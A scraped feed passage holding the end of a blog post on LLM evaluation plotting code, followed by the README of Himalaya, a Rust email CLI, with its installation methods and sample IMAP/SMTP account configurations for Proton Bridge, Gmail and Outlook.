    <span>ax2</span><span>.</span><span>set_ylim</span><span>((</span><span>-</span><span>0.1</span><span>,</span> <span>1.1</span><span>))</span>
    <span>ax2</span><span>.</span><span>legend</span><span>()</span>
    <span>ax2</span><span>.</span><span>set_title</span><span>(</span><span>f</span><span>'PR AUC = </span><span>{</span><span>prauc</span><span>:</span><span>.</span><span>2</span><span>f</span><span>}</span><span>'</span><span>,</span> <span>fontsize</span><span>=</span><span>title_font_size</span><span>)</span>

    <span># Plot prob distribution
</span>    <span>ax3</span><span>.</span><span>grid</span><span>()</span>
    <span>ax3</span><span>.</span><span>hist</span><span>(</span><span>inconsistent</span><span>[</span><span>'pred_proba'</span><span>],</span> <span>color</span><span>=</span><span>'red'</span><span>,</span> <span>alpha</span><span>=</span><span>0.5</span><span>,</span> 
             <span>density</span><span>=</span><span>True</span><span>,</span> <span>label</span><span>=</span><span>'Inconsistent'</span><span>,</span> 
             <span>bins</span><span>=</span><span>max</span><span>(</span><span>int</span><span>(</span><span>inconsistent</span><span>[</span><span>'pred_proba'</span><span>].</span><span>nunique</span><span>()</span><span>/</span><span>20</span><span>),</span> <span>20</span><span>))</span>
    <span>ax3</span><span>.</span><span>hist</span><span>(</span><span>consistent</span><span>[</span><span>'pred_proba'</span><span>],</span> <span>color</span><span>=</span><span>'green'</span><span>,</span> <span>alpha</span><span>=</span><span>0.5</span><span>,</span> 
             <span>density</span><span>=</span><span>True</span><span>,</span> <span>label</span><span>=</span><span>'Consistent'</span><span>,</span> 
             <span>bins</span><span>=</span><span>max</span><span>(</span><span>int</span><span>(</span><span>inconsistent</span><span>[</span><span>'pred_proba'</span><span>].</span><span>nunique</span><span>()</span><span>/</span><span>20</span><span>),</span> <span>20</span><span>))</span>
    <span>ax3</span><span>.</span><span>set_xlabel</span><span>(</span><span>'Prob of inconsistent'</span><span>)</span>
    <span>ax3</span><span>.</span><span>set_ylabel</span><span>(</span><span>'Density'</span><span>)</span>
    <span>ax3</span><span>.</span><span>set_title</span><span>(</span><span>f</span><span>'JS Divergence = </span><span>{</span><span>js_div</span><span>:</span><span>.</span><span>3</span><span>f</span><span>}</span><span>'</span><span>,</span> <span>fontsize</span><span>=</span><span>title_font_size</span><span>)</span>
    <span>ax3</span><span>.</span><span>legend</span><span>()</span>

    <span>plt</span><span>.</span><span>show</span><span>()</span>
</code></pre></div>


            
            
<p>If you found this useful, please cite this write-up as:</p>

<blockquote>
    <p>Yan, Ziyou. (Mar 2024). Task-Specific LLM Evals that Do &amp; Don't Work. eugeneyan.com.
        https://eugeneyan.com/writing/evals/.</p>
</blockquote>

<p>or</p>

<div><pre><code>@article{yan2024evals,
  title   = {Task-Specific LLM Evals that Do &amp; Don't Work},
  author  = {Yan, Ziyou},
  journal = {eugeneyan.com},
  year    = {2024},
  month   = {Mar},
  url     = {https://eugeneyan.com/writing/evals/}
}</code></pre>
</div>

            
            
            



<p><span>Share on:  </span></p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Himalaya: CLI to Manage Emails (266 pts)]]></title>
            <link>https://github.com/pimalaya/himalaya</link>
            <guid>42366025</guid>
            <pubDate>Mon, 09 Dec 2024 13:17:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/pimalaya/himalaya">https://github.com/pimalaya/himalaya</a>, See on <a href="https://news.ycombinator.com/item?id=42366025">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><div dir="auto">
  <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/pimalaya/himalaya/blob/master/logo.svg"><img src="https://github.com/pimalaya/himalaya/raw/master/logo.svg" alt="Logo" width="128" height="128"></a></p><p dir="auto"><h2 tabindex="-1" dir="auto">📫 Himalaya</h2><a id="user-content--himalaya" aria-label="Permalink: 📫 Himalaya" href="#-himalaya"></a></p>
  <p dir="auto">CLI to manage emails, based on <a href="https://crates.io/crates/email-lib" rel="nofollow"><code>email-lib</code></a></p>
  <p dir="auto">
    <a href="https://github.com/pimalaya/himalaya/releases/latest"><img alt="Release" src="https://camo.githubusercontent.com/ef8add1d3f433fb202dbaa1c4ee801b38b0a802accad8e91bfa44d28706a00f1/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f762f72656c656173652f70696d616c6179612f68696d616c6179613f636f6c6f723d73756363657373" data-canonical-src="https://img.shields.io/github/v/release/pimalaya/himalaya?color=success"></a>
	<a href="https://repology.org/project/himalaya/versions" rel="nofollow"><img alt="Repology" src="https://camo.githubusercontent.com/c68cd0dbfafc5b819ebbe0616e333d4270afeb4b567c8b5cd1a5637dda886a7c/68747470733a2f2f696d672e736869656c64732e696f2f7265706f6c6f67792f7265706f7369746f726965732f68696d616c6179613f636f6c6f723d73756363657373" data-canonical-src="https://img.shields.io/repology/repositories/himalaya?color=success"></a>
    <a href="https://matrix.to/#/#pimalaya:matrix.org" rel="nofollow"><img alt="Matrix" src="https://camo.githubusercontent.com/14ffe0c24bb69b5108f40b2db2cd93b905ee44fbd4ff78c4df50fc9a046ed0a4/68747470733a2f2f696d672e736869656c64732e696f2f6d61747269782f70696d616c6179613a6d61747269782e6f72673f636f6c6f723d73756363657373266c6162656c3d63686174" data-canonical-src="https://img.shields.io/matrix/pimalaya:matrix.org?color=success&amp;label=chat"></a>
  </p>
</div>
<div data-snippet-clipboard-copy-content="$ himalaya envelope list --account posteo --folder Archives.FOSS --page 2"><pre><code>$ himalaya envelope list --account posteo --folder Archives.FOSS --page 2
</code></pre></div>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/pimalaya/himalaya/blob/master/screenshot.jpeg"><img src="https://github.com/pimalaya/himalaya/raw/master/screenshot.jpeg" alt="screenshot"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>Multi-accounting configuration:
<ul dir="auto">
<li>interactive via <strong>wizard</strong> (requires <code>wizard</code> feature)</li>
<li>manual via <strong>TOML</strong>-based configuration file (see <a href="https://github.com/pimalaya/himalaya/blob/master/config.sample.toml"><code>./config.sample.toml</code></a>)</li>
</ul>
</li>
<li>Message composition based on <code>$EDITOR</code></li>
<li><strong>IMAP</strong> backend (requires <code>imap</code> feature)</li>
<li><strong>Maildir</strong> backend (requires <code>maildir</code> feature)</li>
<li><strong>Notmuch</strong> backend (requires <code>notmuch</code> feature)</li>
<li><strong>SMTP</strong> backend (requires <code>smtp</code> feature)</li>
<li><strong>Sendmail</strong> backend (requires <code>sendmail</code> feature)</li>
<li>Global system <strong>keyring</strong> for secret management (requires <code>keyring</code> feature)</li>
<li><strong>OAuth 2.0</strong> authorization flow (requires <code>oauth2</code> feature)</li>
<li><strong>JSON</strong> output via <code>--output json</code></li>
<li><strong>PGP</strong> encryption:
<ul dir="auto">
<li>via shell commands (requires <code>pgp-commands</code> feature)</li>
<li>via <a href="https://www.gnupg.org/" rel="nofollow">GPG</a> bindings (requires <code>pgp-gpg</code> feature)</li>
<li>via native implementation (requires <code>pgp-native</code> feature)</li>
</ul>
</li>
</ul>
<p dir="auto"><em>Himalaya CLI is written in <a href="https://www.rust-lang.org/" rel="nofollow">Rust</a>, and relies on <a href="https://doc.rust-lang.org/cargo/reference/features.html" rel="nofollow">cargo features</a> to enable or disable functionalities. Default features can be found in the <code>features</code> section of the <a href="https://github.com/pimalaya/himalaya/blob/master/Cargo.toml#L18"><code>Cargo.toml</code></a>, or on <a href="https://docs.rs/crate/himalaya/latest/features" rel="nofollow">docs.rs</a>.</em></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<details>
  <summary>Pre-built binary</summary>
<p dir="auto">Himalaya CLI can be installed with the installer:</p>
<div dir="auto" data-snippet-clipboard-copy-content="# As root:
$ curl -sSL https://raw.githubusercontent.com/pimalaya/himalaya/master/install.sh | sudo sh

# As a regular user:
$ curl -sSL https://raw.githubusercontent.com/pimalaya/himalaya/master/install.sh | PREFIX=~/.local sh"><pre><span><span>#</span> As root:</span>
$ curl -sSL https://raw.githubusercontent.com/pimalaya/himalaya/master/install.sh <span>|</span> sudo sh

<span><span>#</span> As a regular user:</span>
$ curl -sSL https://raw.githubusercontent.com/pimalaya/himalaya/master/install.sh <span>|</span> PREFIX=<span>~</span>/.local sh</pre></div>
<p dir="auto">These commands install the latest binary from the GitHub <a href="https://github.com/pimalaya/himalaya/releases">releases</a> section.</p>
<p dir="auto">If you want a more up-to-date version than the latest release, check out the <a href="https://github.com/pimalaya/himalaya/actions/workflows/releases.yml"><code>releases</code></a> GitHub workflow and look for the <em>Artifacts</em> section. You should find a pre-built binary matching your OS. These pre-built binaries are built from the <code>master</code> branch.</p>
<p dir="auto"><em>Such binaries are built with the default cargo features. If you want to enable or disable a feature, please use another installation method.</em></p>
</details>
<details>
  <summary>Cargo</summary>
<p dir="auto">Himalaya CLI can be installed with <a href="https://doc.rust-lang.org/cargo/" rel="nofollow">cargo</a>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ cargo install himalaya

# With only IMAP support:
$ cargo install himalaya --no-default-features --features imap"><pre>$ cargo install himalaya

<span><span>#</span> With only IMAP support:</span>
$ cargo install himalaya --no-default-features --features imap</pre></div>
<p dir="auto">You can also use the git repository for a more up-to-date (but less stable) version:</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ cargo install --frozen --force --git https://github.com/pimalaya/himalaya.git"><pre>$ cargo install --frozen --force --git https://github.com/pimalaya/himalaya.git</pre></div>
</details>
<details>
  <summary>Arch Linux</summary>
<p dir="auto">Himalaya CLI can be installed on <a href="https://archlinux.org/" rel="nofollow">Arch Linux</a> with either the community repository:</p>

<p dir="auto">or the <a href="https://aur.archlinux.org/" rel="nofollow">user repository</a>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ git clone https://aur.archlinux.org/himalaya-git.git
$ cd himalaya-git
$ makepkg -isc"><pre>$ git clone https://aur.archlinux.org/himalaya-git.git
$ <span>cd</span> himalaya-git
$ makepkg -isc</pre></div>
<p dir="auto">If you use <a href="https://github.com/Jguer/yay">yay</a>, it is even simplier:</p>

</details>
<details>
  <summary>Homebrew</summary>
<p dir="auto">Himalaya CLI can be installed with <a href="https://brew.sh/" rel="nofollow">Homebrew</a>:</p>

</details>
<details>
  <summary>Scoop</summary>
<p dir="auto">Himalaya CLI can be installed with <a href="https://scoop.sh/" rel="nofollow">Scoop</a>:</p>

</details>
<details>
  <summary>Fedora Linux/CentOS/RHEL</summary>
<p dir="auto">Himalaya CLI can be installed on <a href="https://fedoraproject.org/" rel="nofollow">Fedora Linux</a>/CentOS/RHEL via <a href="https://copr.fedorainfracloud.org/coprs/atim/himalaya/" rel="nofollow">COPR</a> repo:</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ dnf copr enable atim/himalaya
$ dnf install himalaya"><pre>$ dnf copr <span>enable</span> atim/himalaya
$ dnf install himalaya</pre></div>
</details>
<details>
  <summary>Nix</summary>
<p dir="auto">Himalaya CLI can be installed with <a href="https://serokell.io/blog/what-is-nix" rel="nofollow">Nix</a>:</p>

<p dir="auto">You can also use the git repository for a more up-to-date (but less stable) version:</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ nix-env -if https://github.com/pimalaya/himalaya/archive/master.tar.gz

# or, from within the source tree checkout
$ nix-env -if ."><pre>$ nix-env -if https://github.com/pimalaya/himalaya/archive/master.tar.gz

<span><span>#</span> or, from within the source tree checkout</span>
$ nix-env -if <span>.</span></pre></div>
<p dir="auto">If you have the <a href="https://nixos.wiki/wiki/Flakes" rel="nofollow">Flakes</a> feature enabled:</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ nix profile install himalaya

# or, from within the source tree checkout
$ nix profile install

# you can also run Himalaya directly without installing it:
$ nix run himalaya"><pre>$ nix profile install himalaya

<span><span>#</span> or, from within the source tree checkout</span>
$ nix profile install

<span><span>#</span> you can also run Himalaya directly without installing it:</span>
$ nix run himalaya</pre></div>
</details>
<details>
  <summary>Sources</summary>
<p dir="auto">Himalaya CLI can be installed from sources.</p>
<p dir="auto">First you need to install the Rust development environment (see the <a href="https://doc.rust-lang.org/cargo/getting-started/installation.html" rel="nofollow">rust installation documentation</a>):</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ curl https://sh.rustup.rs -sSf | sh"><pre>$ curl https://sh.rustup.rs -sSf <span>|</span> sh</pre></div>
<p dir="auto">Then, you need to clone the repository and install dependencies:</p>
<div dir="auto" data-snippet-clipboard-copy-content="$ git clone https://github.com/pimalaya/himalaya.git
$ cd himalaya
$ cargo check"><pre>$ git clone https://github.com/pimalaya/himalaya.git
$ <span>cd</span> himalaya
$ cargo check</pre></div>
<p dir="auto">Now, you can build Himalaya:</p>

<p dir="auto"><em>Binaries are available under the <code>target/release</code> folder.</em></p>
</details>
<p dir="auto"><h2 tabindex="-1" dir="auto">Configuration</h2><a id="user-content-configuration" aria-label="Permalink: Configuration" href="#configuration"></a></p>
<p dir="auto">Just run <code>himalaya</code>, the wizard will help you to configure your default account.</p>
<p dir="auto">Accounts can be (re)configured via the wizard using the command <code>himalaya account configure &lt;name&gt;</code>.</p>
<p dir="auto">You can also manually edit your own configuration, from scratch:</p>
<ul dir="auto">
<li>Copy the content of the documented <a href="https://github.com/pimalaya/himalaya/blob/master/config.sample.toml"><code>./config.sample.toml</code></a></li>
<li>Paste it in a new file <code>~/.config/himalaya/config.toml</code></li>
<li>Edit, then comment or uncomment the options you want</li>
</ul>
<details>
  <summary>Proton Mail (Bridge)</summary>
<p dir="auto">When using Proton Bridge, emails are synchronized locally and exposed via a local IMAP/SMTP server. This implies 2 things:</p>
<ul dir="auto">
<li>Id order may be reversed or shuffled, but envelopes will still be sorted by date.</li>
<li>SSL/TLS needs to be deactivated manually.</li>
<li>The password to use is the one generated by Proton Bridge, not the one from your Proton Mail account.</li>
</ul>
<div dir="auto" data-snippet-clipboard-copy-content="[accounts.proton]
email = &quot;example@proton.me&quot;

backend.type = &quot;imap&quot;
backend.host = &quot;127.0.0.1&quot;
backend.port = 1143
backend.encryption.type = &quot;none&quot;
backend.login = &quot;example@proton.me&quot;
backend.auth.type = &quot;password&quot;
backend.auth.raw = &quot;*****&quot;

message.send.backend.type = &quot;smtp&quot;
message.send.backend.host = &quot;127.0.0.1&quot;
message.send.backend.port = 1025
message.send.backend.encryption.type = &quot;none&quot;
message.send.backend.login = &quot;example@proton.me&quot;
message.send.backend.auth.type = &quot;password&quot;
message.send.backend.auth.raw = &quot;*****&quot;"><pre>[<span>accounts</span>.<span>proton</span>]
<span>email</span> = <span><span>"</span>example@proton.me<span>"</span></span>

<span>backend.type</span> = <span><span>"</span>imap<span>"</span></span>
<span>backend.host</span> = <span><span>"</span>127.0.0.1<span>"</span></span>
<span>backend.port</span> = <span>1143</span>
<span>backend.encryption.type</span> = <span><span>"</span>none<span>"</span></span>
<span>backend.login</span> = <span><span>"</span>example@proton.me<span>"</span></span>
<span>backend.auth.type</span> = <span><span>"</span>password<span>"</span></span>
<span>backend.auth.raw</span> = <span><span>"</span>*****<span>"</span></span>

<span>message.send.backend.type</span> = <span><span>"</span>smtp<span>"</span></span>
<span>message.send.backend.host</span> = <span><span>"</span>127.0.0.1<span>"</span></span>
<span>message.send.backend.port</span> = <span>1025</span>
<span>message.send.backend.encryption.type</span> = <span><span>"</span>none<span>"</span></span>
<span>message.send.backend.login</span> = <span><span>"</span>example@proton.me<span>"</span></span>
<span>message.send.backend.auth.type</span> = <span><span>"</span>password<span>"</span></span>
<span>message.send.backend.auth.raw</span> = <span><span>"</span>*****<span>"</span></span></pre></div>
<p dir="auto">Keeping your password inside the configuration file is good for testing purpose, but it is not safe. You have 2 better alternatives:</p>
<ul dir="auto">
<li>
<p dir="auto">Save your password in any password manager that can be queried via the CLI:</p>
<div dir="auto" data-snippet-clipboard-copy-content="backend.auth.cmd = &quot;pass show proton&quot;"><pre><span>backend.auth.cmd</span> = <span><span>"</span>pass show proton<span>"</span></span></pre></div>
</li>
<li>
<p dir="auto">Use the global keyring of your system (requires the <code>keyring</code> cargo feature):</p>
<div dir="auto" data-snippet-clipboard-copy-content="backend.auth.keyring = &quot;proton-example&quot;"><pre><span>backend.auth.keyring</span> = <span><span>"</span>proton-example<span>"</span></span></pre></div>
<p dir="auto">Running <code>himalaya configure -a proton</code> will ask for your IMAP password, just paste the one generated previously.</p>
</li>
</ul>
</details>
<details>
  <summary>Gmail</summary>
<p dir="auto">Google passwords cannot be used directly. There is two ways to authenticate yourself:</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Using <a href="https://support.google.com/mail/answer/185833" rel="nofollow">App Passwords</a></h3><a id="user-content-using-app-passwords" aria-label="Permalink: Using App Passwords" href="#using-app-passwords"></a></p>
<p dir="auto">This option is the simplest and the fastest. First, be sure that:</p>
<ul dir="auto">
<li>IMAP is enabled</li>
<li>Two-step authentication is enabled</li>
<li>Less secure app access is enabled</li>
</ul>
<p dir="auto">First create a <a href="https://myaccount.google.com/apppasswords" rel="nofollow">dedicated password</a> for Himalaya.</p>
<div dir="auto" data-snippet-clipboard-copy-content="[accounts.gmail]
email = &quot;example@gmail.com&quot;

folder.alias.inbox = &quot;INBOX&quot;
folder.alias.sent = &quot;[Gmail]/Sent Mail&quot;
folder.alias.drafts = &quot;[Gmail]/Drafts&quot;
folder.alias.trash = &quot;[Gmail]/Trash&quot;

backend.type = &quot;imap&quot;
backend.type.host = &quot;imap.gmail.com&quot;
backend.type.port = 993
backend.type.login = &quot;example@gmail.com&quot;
backend.type.auth.type = &quot;password&quot;
backend.type.auth.raw = &quot;*****&quot;

message.send.backend.type = &quot;smtp&quot;
message.send.backend.host = &quot;smtp.gmail.com&quot;
message.send.backend.port = 465
message.send.backend.login = &quot;example@gmail.com&quot;
message.send.backend.auth.type = &quot;password&quot;
message.send.backend.auth.cmd = &quot;*****&quot;"><pre>[<span>accounts</span>.<span>gmail</span>]
<span>email</span> = <span><span>"</span>example@gmail.com<span>"</span></span>

<span>folder.alias.inbox</span> = <span><span>"</span>INBOX<span>"</span></span>
<span>folder.alias.sent</span> = <span><span>"</span>[Gmail]/Sent Mail<span>"</span></span>
<span>folder.alias.drafts</span> = <span><span>"</span>[Gmail]/Drafts<span>"</span></span>
<span>folder.alias.trash</span> = <span><span>"</span>[Gmail]/Trash<span>"</span></span>

<span>backend.type</span> = <span><span>"</span>imap<span>"</span></span>
<span>backend.type.host</span> = <span><span>"</span>imap.gmail.com<span>"</span></span>
<span>backend.type.port</span> = <span>993</span>
<span>backend.type.login</span> = <span><span>"</span>example@gmail.com<span>"</span></span>
<span>backend.type.auth.type</span> = <span><span>"</span>password<span>"</span></span>
<span>backend.type.auth.raw</span> = <span><span>"</span>*****<span>"</span></span>

<span>message.send.backend.type</span> = <span><span>"</span>smtp<span>"</span></span>
<span>message.send.backend.host</span> = <span><span>"</span>smtp.gmail.com<span>"</span></span>
<span>message.send.backend.port</span> = <span>465</span>
<span>message.send.backend.login</span> = <span><span>"</span>example@gmail.com<span>"</span></span>
<span>message.send.backend.auth.type</span> = <span><span>"</span>password<span>"</span></span>
<span>message.send.backend.auth.cmd</span> = <span><span>"</span>*****<span>"</span></span></pre></div>
<p dir="auto">Keeping your password inside the configuration file is good for testing purpose, but it is not safe. You have 2 better alternatives:</p>
<ul dir="auto">
<li>
<p dir="auto">Save your password in any password manager that can be queried via the CLI:</p>
<div dir="auto" data-snippet-clipboard-copy-content="backend.auth.cmd = &quot;pass show gmail&quot;"><pre><span>backend.auth.cmd</span> = <span><span>"</span>pass show gmail<span>"</span></span></pre></div>
</li>
<li>
<p dir="auto">Use the global keyring of your system (requires the <code>keyring</code> cargo feature):</p>
<div dir="auto" data-snippet-clipboard-copy-content="backend.auth.keyring = &quot;gmail-example&quot;"><pre><span>backend.auth.keyring</span> = <span><span>"</span>gmail-example<span>"</span></span></pre></div>
<p dir="auto">Running <code>himalaya configure -a gmail</code> will ask for your IMAP password, just paste the one generated previously.</p>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Using OAuth 2.0</h3><a id="user-content-using-oauth-20" aria-label="Permalink: Using OAuth 2.0" href="#using-oauth-20"></a></p>
<p dir="auto">This option is the most secure but the hardest to configure. It requires the <code>oauth2</code> and <code>keyring</code> cargo features.</p>
<p dir="auto">First, you need to get your OAuth 2.0 credentials by following <a href="https://developers.google.com/identity/protocols/oauth2#1.-obtain-oauth-2.0-credentials-from-the-dynamic_data.setvar.console_name-." rel="nofollow">this guide</a>. Once you get your client id and your client secret, you can configure your Himalaya account this way:</p>
<div dir="auto" data-snippet-clipboard-copy-content="[accounts.gmail]
email = &quot;example@gmail.com&quot;

folder.alias.inbox = &quot;INBOX&quot;
folder.alias.sent = &quot;[Gmail]/Sent Mail&quot;
folder.alias.drafts = &quot;[Gmail]/Drafts&quot;
folder.alias.trash = &quot;[Gmail]/Trash&quot;

backend.type = &quot;imap&quot;
backend.host = &quot;imap.gmail.com&quot;
backend.port = 993
backend.login = &quot;example@gmail.com&quot;
backend.auth.type = &quot;oauth2&quot;
backend.auth.client-id = &quot;*****&quot;
backend.auth.client-secret.keyring = &quot;gmail-oauth2-client-secret&quot;
backend.auth.access-token.keyring = &quot;gmail-oauth2-access-token&quot;
backend.auth.refresh-token.keyring = &quot;gmail-oauth2-refresh-token&quot;
backend.auth.auth-url = &quot;https://accounts.google.com/o/oauth2/v2/auth&quot;
backend.auth.token-url = &quot;https://www.googleapis.com/oauth2/v3/token&quot;
backend.auth.pkce = true
backend.auth.scope = &quot;https://mail.google.com/&quot;

message.send.backend.type = &quot;smtp&quot;
message.send.backend.host = &quot;smtp.gmail.com&quot;
message.send.backend.port = 465
message.send.backend.login = &quot;example@gmail.com&quot;
message.send.backend.auth.type = &quot;oauth2&quot;
message.send.backend.auth.client-id = &quot;*****&quot;
message.send.backend.auth.client-secret.keyring = &quot;gmail-oauth2-client-secret&quot;
message.send.backend.auth.access-token.keyring = &quot;gmail-oauth2-access-token&quot;
message.send.backend.auth.refresh-token.keyring = &quot;gmail-oauth2-refresh-token&quot;
message.send.backend.auth.auth-url = &quot;https://accounts.google.com/o/oauth2/v2/auth&quot;
message.send.backend.auth.token-url = &quot;https://www.googleapis.com/oauth2/v3/token&quot;
message.send.backend.auth.pkce = true
message.send.backend.auth.scope = &quot;https://mail.google.com/&quot;"><pre>[<span>accounts</span>.<span>gmail</span>]
<span>email</span> = <span><span>"</span>example@gmail.com<span>"</span></span>

<span>folder.alias.inbox</span> = <span><span>"</span>INBOX<span>"</span></span>
<span>folder.alias.sent</span> = <span><span>"</span>[Gmail]/Sent Mail<span>"</span></span>
<span>folder.alias.drafts</span> = <span><span>"</span>[Gmail]/Drafts<span>"</span></span>
<span>folder.alias.trash</span> = <span><span>"</span>[Gmail]/Trash<span>"</span></span>

<span>backend.type</span> = <span><span>"</span>imap<span>"</span></span>
<span>backend.host</span> = <span><span>"</span>imap.gmail.com<span>"</span></span>
<span>backend.port</span> = <span>993</span>
<span>backend.login</span> = <span><span>"</span>example@gmail.com<span>"</span></span>
<span>backend.auth.type</span> = <span><span>"</span>oauth2<span>"</span></span>
<span>backend.auth.client-id</span> = <span><span>"</span>*****<span>"</span></span>
<span>backend.auth.client-secret.keyring</span> = <span><span>"</span>gmail-oauth2-client-secret<span>"</span></span>
<span>backend.auth.access-token.keyring</span> = <span><span>"</span>gmail-oauth2-access-token<span>"</span></span>
<span>backend.auth.refresh-token.keyring</span> = <span><span>"</span>gmail-oauth2-refresh-token<span>"</span></span>
<span>backend.auth.auth-url</span> = <span><span>"</span>https://accounts.google.com/o/oauth2/v2/auth<span>"</span></span>
<span>backend.auth.token-url</span> = <span><span>"</span>https://www.googleapis.com/oauth2/v3/token<span>"</span></span>
<span>backend.auth.pkce</span> = <span>true</span>
<span>backend.auth.scope</span> = <span><span>"</span>https://mail.google.com/<span>"</span></span>

<span>message.send.backend.type</span> = <span><span>"</span>smtp<span>"</span></span>
<span>message.send.backend.host</span> = <span><span>"</span>smtp.gmail.com<span>"</span></span>
<span>message.send.backend.port</span> = <span>465</span>
<span>message.send.backend.login</span> = <span><span>"</span>example@gmail.com<span>"</span></span>
<span>message.send.backend.auth.type</span> = <span><span>"</span>oauth2<span>"</span></span>
<span>message.send.backend.auth.client-id</span> = <span><span>"</span>*****<span>"</span></span>
<span>message.send.backend.auth.client-secret.keyring</span> = <span><span>"</span>gmail-oauth2-client-secret<span>"</span></span>
<span>message.send.backend.auth.access-token.keyring</span> = <span><span>"</span>gmail-oauth2-access-token<span>"</span></span>
<span>message.send.backend.auth.refresh-token.keyring</span> = <span><span>"</span>gmail-oauth2-refresh-token<span>"</span></span>
<span>message.send.backend.auth.auth-url</span> = <span><span>"</span>https://accounts.google.com/o/oauth2/v2/auth<span>"</span></span>
<span>message.send.backend.auth.token-url</span> = <span><span>"</span>https://www.googleapis.com/oauth2/v3/token<span>"</span></span>
<span>message.send.backend.auth.pkce</span> = <span>true</span>
<span>message.send.backend.auth.scope</span> = <span><span>"</span>https://mail.google.com/<span>"</span></span></pre></div>
<p dir="auto">Running <code>himalaya configure -a gmail</code> will complete your OAuth 2.0 setup and ask for your client secret.</p>
</details>
<details>
  <summary>Outlook</summary>
<div dir="auto" data-snippet-clipboard-copy-content="[accounts.outlook]
email = &quot;example@outlook.com&quot;

backend.type = &quot;imap&quot;
backend.host = &quot;outlook.office365.com&quot;
backend.port = 993
backend.login = &quot;example@outlook.com&quot;
backend.auth.type = &quot;password&quot;
backend.auth.raw = &quot;*****&quot;

message.send.backend.type = &quot;smtp&quot;
message.send.backend.host = &quot;smtp-mail.outlook.com&quot;
message.send.backend.port = 587
message.send.backend.encryption.type = &quot;start-tls&quot;
message.send.backend.login = &quot;example@outlook.com&quot;
message.send.backend.auth.type = &quot;password&quot;
message.send.backend.auth.raw = &quot;*****&quot;"><pre>[<span>accounts</span>.<span>outlook</span>]
<span>email</span> = <span><span>"</span>example@outlook.com<span>"</span></span>

<span>backend.type</span> = <span><span>"</span>imap<span>"</span></span>
<span>backend.host</span> = <span><span>"</span>outlook.office365.com<span>"</span></span>
<span>backend.port</span> = <span>993</span>
<span>backend.login</span> = <span><span>"</span>example@outlook.com<span>"</span></span>
<span>backend.auth.type</span> = <span><span>"</span>password<span>"</span></span>
<span>backend.auth.raw</span> = <span><span>"</span>*****<span>"</span></span>

<span>message.send.backend.type</span> = <span><span>"</span>smtp<span>"</span></span>
<span>message.send.backend.host</span> = <span><span>"</span>smtp-mail.outlook.com<span>"</span></span>
<span>message.send.backend.port</span> = <span>587</span>
<span>message.send.backend.encryption.type</span> = <span><span>"</span>start-tls<span>"</span></span>
<span>message.send.backend.login</span> = <span><span>"</span>example@outlook.com<span>"</span></span>
<span>message.send.backend.auth.type</span> = <span><span>"</span>password<span>"</span></span>
<span>message.send.backend.auth.raw</span> = <span><span>"</span>*****<span>"</span></span></pre></div>
<p dir="auto">Keeping your password inside the configuration file is good for testing purpose, but it is not safe. You have 2 better alternatives:</p>
<ul dir="auto">
<li>
<p dir="auto">Save your password in any password manager that can be queried via the CLI:</p>
<div dir="auto" data-snippet-clipboard-copy-content="backend.auth.cmd = &quot;pass show outlook&quot;"><pre><span>backend.auth.cmd</span> = <span><span>"</span>pass show outlook<span>"</span></span></pre></div>
</li>
<li>
<p dir="auto">Use the global keyring of your system (requires the <code>keyring</code> cargo feature):</p>
<div dir="auto" data-snippet-clipboard-copy-content="backend.auth.keyring = &quot;outlook-example&quot;"><pre><span>backend.auth.keyring</span> = <span><span>"</span>outlook-example<span>"</span></span></pre></div>
<p dir="auto">Running <code>himalaya configure -a outlook</code> will ask for your IMAP password, just paste the one generated previously.</p>
</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Using OAuth 2.0</h3><a id="user-content-using-oauth-20-1" aria-label="Permalink: Using OAuth 2.0" href="#using-oauth-20-1"></a></p>
<p dir="auto">This option is the most secure but the hardest to configure. First, you need to get your OAuth 2.0 credentials by following <a href="https://learn.microsoft.com/en-us/exchange/client-developer/legacy-protocols/how-to-authenticate-an-imap-pop-smtp-application-by-using-oauth" rel="nofollow">this guide</a>. Once you get your client id and your client secret, you can configure your Himalaya account this way:</p>
<div dir="auto" data-snippet-clipboard-copy-content="[accounts.outlook]
email = &quot;example@outlook.com&quot;

backend.type = &quot;imap&quot;
backend.host = &quot;outlook.office365.com&quot;
backend.port = 993
backend.login = &quot;example@outlook.com&quot;
backend.auth.type = &quot;oauth2&quot;
backend.auth.client-id = &quot;*****&quot;
backend.auth.client-secret.keyring = &quot;outlook-oauth2-client-secret&quot;
backend.auth.access-token.keyring = &quot;outlook-oauth2-access-token&quot;
backend.auth.refresh-token.keyring = &quot;outlook-oauth2-refresh-token&quot;
backend.auth.auth-url = &quot;https://login.microsoftonline.com/common/oauth2/v2.0/authorize&quot;
backend.auth.token-url = &quot;https://login.microsoftonline.com/common/oauth2/v2.0/token&quot;
backend.auth.pkce = true
backend.auth.scopes = [&quot;https://outlook.office.com/IMAP.AccessAsUser.All&quot;, &quot;https://outlook.office.com/SMTP.Send&quot;]

message.send.backend.type = &quot;smtp&quot;
message.send.backend.host = &quot;smtp.mail.outlook.com&quot;
message.send.backend.port = 587
message.send.backend.starttls = true
message.send.backend.login = &quot;example@outlook.com&quot;
message.send.backend.auth.type = &quot;oauth2&quot;
message.send.backend.auth.client-id = &quot;*****&quot;
message.send.backend.auth.client-secret.keyring = &quot;outlook-oauth2-client-secret&quot;
message.send.backend.auth.access-token.keyring = &quot;outlook-oauth2-access-token&quot;
message.send.backend.auth.refresh-token.keyring = &quot;outlook-oauth2-refresh-token&quot;
